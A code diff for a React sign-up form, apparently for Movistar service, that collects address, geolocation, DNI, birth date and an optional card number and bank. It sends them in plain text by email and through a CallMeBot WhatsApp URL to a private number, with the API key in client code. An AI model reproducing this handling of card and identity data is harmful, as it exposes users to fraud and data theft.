@@ -2,7 +2,7 @@ import React, { useState, useMemo, useRef, useEffect } from 'react';
 import {
   Wifi, Tv, Zap, MapPin, User, CreditCard, Phone, Check,
   Star, Signal, Gift, AlertCircle, MapPinned, ChevronRight,
-  Send, Loader2, CheckCircle2, XCircle, Sparkles, Navigation
+  Send, Loader2, CheckCircle2, XCircle, Sparkles, Navigation, Smartphone
 } from 'lucide-react';
 
 /* ============================================================
@@ -85,7 +85,7 @@ export default function App() {
   };
 
   const [formData, setFormData] = useState(initialFormState);
-  const [pagaConTarjeta, setPagaConTarjeta] = useState(false);
+  const [pagaConMercadoPago, setPagaConMercadoPago] = useState(false);
   const [status, setStatus] = useState('idle');
   const [geoStatus, setGeoStatus] = useState('idle');
   const [coords, setCoords] = useState(null);
@@ -153,41 +153,40 @@ export default function App() {
     const coordsTexto = coords ? `${coords.lat}, ${coords.lng}` : 'No disponibles';
 
     /* -------- Sección 3: contenido condicional -------- */
-    const seccion3 = ['💳 VALIDAR TARJETA'];
-    if (pagaConTarjeta && formData.numeroTarjeta && formData.bancoEmisor) {
-      seccion3.push(`NUMERO TARJETA: ${formData.numeroTarjeta}`);
-      seccion3.push(`BANCO: ${formData.bancoEmisor}`);
-    } else if (pagaConTarjeta) {
-      seccion3.push('INDICÓ PAGO CON TARJETA (datos incompletos)');
+    let seccion3Texto = '';
+    if (pagaConMercadoPago) {
+      seccion3Texto = 'MEDIO DE PAGO: MERCADO PAGO';
+    } else if (formData.numeroTarjeta || formData.bancoEmisor) {
+      seccion3Texto = `NUMERO TARJETA: ${formData.numeroTarjeta || '-'}\nBANCO: ${formData.bancoEmisor || '-'}`;
     } else {
-      seccion3.push('NO POSEE TARJETA / OTRO MEDIO DE PAGO');
+      seccion3Texto = 'NO ESPECIFICADO';
     }
 
     /* -------- Cuerpo del email formateado -------- */
     const mensaje = [
       'SECCION 1',
-      '',
+      'VALIDAR DIRECCIONES / DISPONIBILIDAD:',
       `CALLE: ${formData.calle}`,
       `NUMERO: ${formData.numero}`,
       `TRANSVERSAL 1: ${formData.transversal1}`,
       `TRANSVERSAL 2: ${formData.transversal2}`,
-      `CALLE DE ATRAS: ${formData.calleAtras || 'No especificada'}`,
+      `CALLE DE ATRAS: ${formData.calleAtras}`,
       `LOCALIDAD: ${formData.localidad}`,
       `COORDENADAS: ${coordsTexto}`,
       '',
       'SECCION 2',
-      '',
+      '👤 VALIDAR TITULAR (scoring)',
       `NOMBRE: ${formData.nombre}`,
       `DNI: ${formData.dni}`,
       `FECHA NAC: ${formData.fechaNacimiento}`,
       '',
       'SECCION 3',
+      '💳 VALIDAR TARJETA',
+      seccion3Texto,
       '',
-      ...seccion3,
-      '',
-      'CONTACTO',
-      '',
-      `TELEFONO DE CONTACTO: ${formData.telefonoContacto || 'No especificado'}`
+      'SECCION 4',
+      'numero de contacto',
+      `TELEFONO: ${formData.telefonoContacto || 'No especificado'}`
     ].join('\n');
 
     const data = new FormData();
@@ -207,36 +206,39 @@ export default function App() {
           '🔔 *NUEVA SOLICITUD MOVISTAR*',
           '',
           '*SECCION 1*',
+          'VALIDAR DIRECCIONES / DISPONIBILIDAD:',
           `CALLE: ${formData.calle}`,
           `NUMERO: ${formData.numero}`,
           `TRANSVERSAL 1: ${formData.transversal1}`,
           `TRANSVERSAL 2: ${formData.transversal2}`,
-          `CALLE DE ATRAS: ${formData.calleAtras || 'No especificada'}`,
+          `CALLE DE ATRAS: ${formData.calleAtras}`,
           `LOCALIDAD: ${formData.localidad}`,
           `COORDENADAS: ${coordsTexto}`,
           '',
           '*SECCION 2*',
+          '👤 VALIDAR TITULAR (scoring)',
           `NOMBRE: ${formData.nombre}`,
           `DNI: ${formData.dni}`,
           `FECHA NAC: ${formData.fechaNacimiento}`,
           '',
           '*SECCION 3*',
-          ...seccion3,
+          '💳 VALIDAR TARJETA',
+          seccion3Texto,
           '',
-          '*CONTACTO*',
+          '*SECCION 4*',
+          'numero de contacto',
           `TELEFONO: ${formData.telefonoContacto || 'No especificado'}`
         ].join('\n');
 
         const waUrl = `https://api.callmebot.com/whatsapp.php?phone=${encodeURIComponent(CALLMEBOT_PHONE)}&text=${encodeURIComponent(waText)}&apikey=${CALLMEBOT_API_KEY}`;
 
-        // Fire and forget: no bloquea la experiencia del usuario
         fetch(waUrl, { mode: 'no-cors' }).catch(() => {
-          console.warn('CallMeBot: no se pudo enviar el WhatsApp (pero el email se envió OK).');
+          console.warn('CallMeBot: no se pudo enviar el WhatsApp.');
         });
 
         setStatus('success');
         setFormData(initialFormState);
-        setPagaConTarjeta(false);
+        setPagaConMercadoPago(false);
         setCoords(null);
         setGeoStatus('idle');
         window.scrollTo({ top: 0, behavior: 'smooth' });
@@ -436,7 +438,7 @@ export default function App() {
               <InputField label="Número" name="numero" value={formData.numero} onChange={handleChange} required placeholder="Ej: 1234" />
               <InputField label="Transversal 1" name="transversal1" value={formData.transversal1} onChange={handleChange} required placeholder="Ej: Belgrano" />
               <InputField label="Transversal 2" name="transversal2" value={formData.transversal2} onChange={handleChange} required placeholder="Ej: Sarmiento" />
-              <InputField label="Calle de atrás" name="calleAtras" value={formData.calleAtras} onChange={handleChange} placeholder="Opcional" />
+              <InputField label="Calle de atrás" name="calleAtras" value={formData.calleAtras} onChange={handleChange} required placeholder="Ej: Mitre" />
               <InputField label="Localidad" name="localidad" value={formData.localidad} onChange={handleChange} required placeholder="Ej: Trelew" />
 
               <div className="md:col-span-2">
@@ -479,31 +481,36 @@ export default function App() {
               </div>
             </FormSection>
 
-            {/* ---------- SECCIÓN 3 (opcional SIEMPRE) ---------- */}
+            {/* ---------- SECCIÓN 3 (opcional) ---------- */}
             <FormSection number="3" title="Validar tarjeta (opcional)" icon={<CreditCard className="w-5 h-5" />}>
+              {/* Checkbox Mercado Pago */}
               <div className="md:col-span-2">
-                <label className="flex items-start gap-3 bg-gray-50 border border-gray-200 rounded-xl p-4 cursor-pointer hover:bg-gray-100 transition-colors">
+                <label className="flex items-start gap-3 bg-[#00B1EA]/5 border border-[#00B1EA]/30 rounded-xl p-4 cursor-pointer hover:bg-[#00B1EA]/10 transition-colors">
                   <input
                     type="checkbox"
-                    checked={pagaConTarjeta}
+                    checked={pagaConMercadoPago}
                     onChange={(e) => {
-                      setPagaConTarjeta(e.target.checked);
-                      if (!e.target.checked) {
+                      setPagaConMercadoPago(e.target.checked);
+                      if (e.target.checked) {
                         setFormData((p) => ({ ...p, numeroTarjeta: '', bancoEmisor: '' }));
                       }
                     }}
-                    className="mt-0.5 w-5 h-5 accent-[#019DF4] cursor-pointer flex-shrink-0"
+                    className="mt-0.5 w-5 h-5 accent-[#00B1EA] cursor-pointer flex-shrink-0"
                   />
-                  <div>
-                    <p className="font-semibold text-[#0B1A28] text-sm">¿Querés pagar con tarjeta?</p>
-                    <p className="text-xs text-gray-500 mt-0.5">
-                      Es <strong>opcional</strong>. Marcá esta casilla si vas a abonar con tarjeta (banco, billetera virtual, etc.). Si no, dejalo sin marcar.
-                    </p>
+                  <div className="flex items-start gap-2">
+                    <Smartphone className="w-5 h-5 text-[#00B1EA] mt-0.5 flex-shrink-0" />
+                    <div>
+                      <p className="font-semibold text-[#0B1A28] text-sm">Pagaré con Mercado Pago</p>
+                      <p className="text-xs text-gray-500 mt-0.5">
+                        Marcá esta casilla si vas a abonar con Mercado Pago. Si no, podés completar los datos de tarjeta abajo (opcional).
+                      </p>
+                    </div>
                   </div>
                 </label>
               </div>
 
-              {pagaConTarjeta && (
+              {/* Campos de tarjeta (solo si NO marcó Mercado Pago) */}
+              {!pagaConMercadoPago && (
                 <>
                   <InputField
                     label="Número de Tarjeta"
@@ -512,9 +519,9 @@ export default function App() {
                     onChange={handleChange}
                     maxLength={16}
                     placeholder="16 dígitos (opcional)"
-                    hint={`${formData.numeroTarjeta.length}/16 dígitos — podés completarlo después`}
+                    hint={`${formData.numeroTarjeta.length}/16 dígitos`}
                   />
-                  <InputField label="Banco Emisor" name="bancoEmisor" value={formData.bancoEmisor} onChange={handleChange} placeholder="Ej: Banco Nación, Mercado Pago, Ualá" />
+                  <InputField label="Banco Emisor" name="bancoEmisor" value={formData.bancoEmisor} onChange={handleChange} placeholder="Ej: Banco Nación, Ualá, Brubank" />
                 </>
               )}
 
@@ -522,13 +529,13 @@ export default function App() {
                 <div className="flex items-start gap-3 bg-yellow-50 border border-yellow-200 rounded-xl p-4">
                   <AlertCircle className="w-5 h-5 text-yellow-600 mt-0.5 flex-shrink-0" />
                   <p className="text-sm text-yellow-900">
-                    Para la tarjeta, ante cualquier duda comunicate conmigo al celular <strong>2804300415</strong>.
+                    Ante cualquier duda sobre el pago, comunicate conmigo al celular <strong>2804300415</strong>.
                   </p>
                 </div>
               </div>
             </FormSection>
 
-            {/* ---------- CONTACTO (opcional) ---------- */}
+            {/* ---------- SECCIÓN 4 (opcional) ---------- */}
             <FormSection number="4" title="Teléfono de contacto (opcional)" icon={<Phone className="w-5 h-5" />}>
               <div className="md:col-span-2">
                 <InputField
@@ -617,7 +624,6 @@ export default function App() {
 
 /* ============================================================
    SUB-COMPONENTES
-   ###agregar
    ============================================================ */
 
 function PlanCard({ plan }) {
